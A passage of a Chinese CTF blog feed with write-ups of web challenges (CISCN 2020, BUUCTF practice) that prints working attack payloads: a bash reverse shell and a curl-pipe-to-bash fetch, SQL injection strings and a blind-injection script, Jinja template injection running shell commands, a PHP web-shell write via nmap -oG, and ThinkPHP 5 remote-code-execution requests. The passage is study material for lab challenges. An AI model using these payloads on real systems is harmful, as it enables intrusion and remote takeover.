class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 正则过滤绕过：</span><br><span class="line">  很容易看懂，格式为&#123;<span class="variable"><span class="keyword">if</span></span>:<span class="variable">payload</span>&#125;&#123;<span class="variable">end</span> <span class="variable"><span class="keyword">if</span></span>&#125;，可利用的地方在<span class="variable">payload</span>处。</span><br><span class="line"><span class="number">2</span>. 字符串过滤绕过：</span><br><span class="line">  <span class="function"><span class="title">hex2bin</span>(<span class="title">dechex</span>(<span class="variable">xxx</span>)).hex2bin(<span class="title">dechex</span>(<span class="variable">xxx</span>))</span></span><br><span class="line"><span class="number">3</span>. 拼接字符串执行命令</span><br><span class="line">  简单来说就是闭合<span class="variable"><span class="keyword">if</span></span>语句。</span><br></pre></td></tr></table></figure><p>根据之前的题目，直接构造phpinfo</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="keyword">if</span>:<span class="number">1</span>)(hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">104</span>)).hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">105</span>)).hex2bin(dechex(<span class="number">110</span>)).hex2bin(dechex(<span class="number">102</span>)).hex2bin(dechex(<span class="number">111</span>)))();die();<span class="comment">//&#125;&#123;end%20if&#125;</span></span><br></pre></td></tr></table></figure><p>也有师傅用反引号绕过</p><p>起一个http服务器，写入反弹shell命令。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c 'bash -i &gt;/dev/tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span>'</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">?a</span>=&#123;<span class="symbol">if:</span><span class="string">`curl ip:port/x |bash`</span>&#125;&#123;<span class="keyword">end</span>+<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200824154556091.png" alt="image-20200824154556091"></p>]]></content>
    
    <summary type="html">
    
      最近比赛多，没时间写博客。今天补上顺带学学其他师傅的姿势(ง •_•)ง
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>8月刷题记录</title>
    <link href="https://0xcreed.jxustctf.top/2020/08/8%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://0xcreed.jxustctf.top/2020/08/8%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-08-02T10:15:31.000Z</published>
    <updated>2021-03-22T08:05:46.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>伪协议加文件包含</p><p><code>?file=php://filter/read/convert.base64-encode/resource=flag.php</code></p><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令执行</p><p><code>127.0.0.1;cat /flag</code></p><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><a id="more"></a><p>看题目直接扫目录</p><p><img src="/2020/08/8月刷题记录/image-20200802182510227.png" alt="image-20200802182510227"></p><p><img src="/2020/08/8月刷题记录/image-20200802182531380.png" alt="image-20200802182531380"></p><p>弱类型比较</p><p><code>?key=123</code></p><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>phtml绕过</p><p><img src="/2020/08/8月刷题记录/image-20200802184054101.png" alt="image-20200802184054101"></p><p><img src="/2020/08/8月刷题记录/image-20200802184125661.png" alt="image-20200802184125661"></p><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>过滤了union、and、or、空格等，包括<code>/**/</code></p><p>输入<code>1/1</code>时会正常返回结果，可以判断这是数字型的sql注入。</p><p>可以用<code>()</code>绕过空白符</p><p>payload</p><p><code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://1bc1fd51-0f6f-43b5-bd9e-c19e86a6e238.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(x, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先传参 <code>text=welcome to the zjctf</code> 这里要注意<code>file_get_contents</code>，不能直接GET传参，要通过伪协议。</p><p>data：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p><p>input: text=php://input,然后POST <code>welcome to the zjctf</code></p><p><img src="/2020/08/8月刷题记录/image-20200808211240153.png" alt="image-20200808211240153"></p><p>按照提示读取<code>useless.php</code></p><p><img src="/2020/08/8月刷题记录/image-20200808211342281.png" alt="image-20200808211342281"></p><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> Flag();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200808211534697.png" alt="image-20200808211534697"></p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="BJDCTF2020]Easy MD5"></a>BJDCTF2020]Easy MD5</h3><p>headers中有提示</p><p><img src="/2020/08/8月刷题记录/image-20200808223026062.png" alt="image-20200808223026062"></p><p>md5($pass,true)的结果是原始的二进制格式字符串，拼接到语句中就可能会造成SQL注入。</p><p>具体参考：<em><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></em></p><p>输入密码 <code>ffifdyop</code>，即可登录。</p><p>来到下一关</p><p><img src="/2020/08/8月刷题记录/image-20200808223634396.png" alt="image-20200808223634396"></p><p>直接数组绕过</p><p><code>http://3a0f2829-16ea-4ecd-b023-04ac47f0511a.node3.buuoj.cn/levels91.php?a[]=2&amp;b[]=3</code></p><p>下一关</p><p><img src="/2020/08/8月刷题记录/image-20200808223852953.png" alt="image-20200808223852953"></p><p>还是数组绕过</p><p>或者利用<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">工具</a>碰撞</p><p><img src="/2020/08/8月刷题记录/image-20200808230558650.png" alt="image-20200808230558650"></p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>随便输个字符串，会直接返回输入的字符串。结果的源码提示了SSTI</p><p><code>1</code>返回1，确实存在SSTI。而且没过滤。</p><p>查看根目录</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(<span class="string">"__import__('os').popen('ls /').read()"</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>接着用上面的读取flag即可</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">  $host = escapeshellarg($host);</span><br><span class="line">  $host = escapeshellcmd($host);</span><br><span class="line">  $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  chdir($sandbox);</span><br><span class="line">  <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>escapeshellarg()</code>和 <code>escapeshellcmd(t)</code>同时使用会造成单引号逃逸</p><p>具体参考：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"><span class="number">2.</span>经过escapeshellarg处理后变成了'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\'' -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"><span class="number">3.</span>经过escapeshellcmd处理后变成'<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义</span><br><span class="line"><span class="number">4.</span>最后执行的命令是curl '<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\'' -v -d a=<span class="number">1</span>\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\ -v -d a=<span class="number">1</span>'，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'。</span><br></pre></td></tr></table></figure><p>然后 nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><p>payload host=<code>&#39; &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG a.php &#39;</code></p><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>WEB-INF/web.xml泄露</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接下载<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><p>漏洞成因：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。一般情况，jsp引擎默认都是禁止访问WEB<span class="literal">-INF</span>目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB<span class="literal">-INF</span>目录就好了： <span class="keyword">location</span> <span class="title">~ ^/WEB-INF</span>/* &#123; <span class="keyword">deny</span> all; &#125; 或者return <span class="number">404</span>; 或者其他！</span><br></pre></td></tr></table></figure><p>第一个坑，download请求要POST参数，GET无效</p><p>先读取web.xml</p><p><img src="/2020/08/8月刷题记录/image-20200809090311609.png" alt="image-20200809090311609"></p><p>再读取<code>FlagController.class</code></p><p><img src="/2020/08/8月刷题记录/image-20200809090432741.png" alt="image-20200809090432741"></p><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>页面源码有一串字符，先Base32后Base64解码</p><p><code>select * from user where username = &#39;$name&#39;</code></p><p>然后测试下页面逻辑，先判断用户是否存在，不存在就返回<code>wrong user!</code>，存在则接着判断密码，密码错误则返回<code>wrong pass!</code></p><p>大概过滤了这些字符</p><p><img src="/2020/08/8月刷题记录/image-20200809092100640.png" alt="image-20200809092100640"></p><p>直接可以用联合注入，表里有三列</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">Order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>进行用联合注入，回显wrong user!，说明用户不在第一列</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'e10adc3949ba59abbe56e057f20f883e'</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h3><p>主页提示ThinkPHP5框架，直接用exp打，报错得到版本信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200809100312733.png" alt="image-20200809100312733"></p><p>然后直接用5.0.23exp打</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?s=captcha</span><br><span class="line">POST: _method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">ls</span> -<span class="title">al</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200809100351723.png" alt="image-20200809100351723"></p><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = 